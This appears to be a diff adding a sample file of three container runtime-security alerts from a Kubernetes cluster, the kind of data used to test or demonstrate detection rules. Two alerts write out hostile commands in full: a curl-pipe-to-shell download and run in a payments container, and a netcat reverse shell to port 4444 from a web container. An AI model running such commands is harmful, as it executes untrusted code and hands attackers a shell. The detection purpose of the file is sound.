@@ -1,0 +1,52 @@
+[
+    {
+    "time": "2026-11-09T10:15:02.123456789Z",
+    "rule": "Terminal shell in container",
+    "priority": "Notice",
+    "output": "10:15:02.123456789: Notice A shell was spawned in a container with an attached terminal (user=root container=payments-api shell=bash parent=java cmdline=bash -c curl http://203.0.113.9/x.sh | sh)",
+    "tags": ["container", "shell", "mitre_execution"],
+    "output_fields": {
+        "user.name": "root",
+        "container.name": "payments-api",
+        "k8s.ns.name": "production",
+        "k8s.pod.name": "payments-api-7d9f8",
+        "proc.name": "bash",
+        "proc.pname": "java",
+        "proc.cmdline": "bash -c curl http://203.0.113.9/x.sh | sh"
+    }
+    },
+    {
+    "time": "2026-11-09T10:20:41.554433221Z",
+    "rule": "Launch Package Management Process in Container",
+    "priority": "Error",
+    "output": "10:20:41.554433221: Error Package management process launched in container (user=root container=ci-builder process=apt-get cmdline=apt-get install -y git)",
+    "tags": ["container", "process"],
+    "output_fields": {
+        "user.name": "root",
+        "container.name": "ci-builder",
+        "k8s.ns.name": "ci",
+        "k8s.pod.name": "ci-builder-1423",
+        "proc.name": "apt-get",
+        "proc.pname": "sh",
+        "proc.cmdline": "apt-get install -y git"
+    }
+    },
+    {
+    "time": "2026-11-09T10:31:09.778899001Z",
+    "rule": "Unexpected outbound connection destination",
+    "priority": "Warning",
+    "output": "10:31:09.778899001: Warning Outbound connection to unexpected destination (user=www-data container=web-frontend process=nc connection=198.51.100.23:4444 cmdline=nc 198.51.100.23 4444 -e /bin/sh)",
+    "tags": ["container", "network"],
+    "output_fields": {
+        "user.name": "www-data",
+        "container.name": "web-frontend",
+        "k8s.ns.name": "production",
+        "k8s.pod.name": "web-frontend-5c6b4",
+        "proc.name": "nc",
+        "proc.pname": "nginx",
+        "proc.cmdline": "nc 198.51.100.23 4444 -e /bin/sh",
+        "fd.sip": "198.51.100.23",
+        "fd.sport": 4444
+    }
+    }
+]
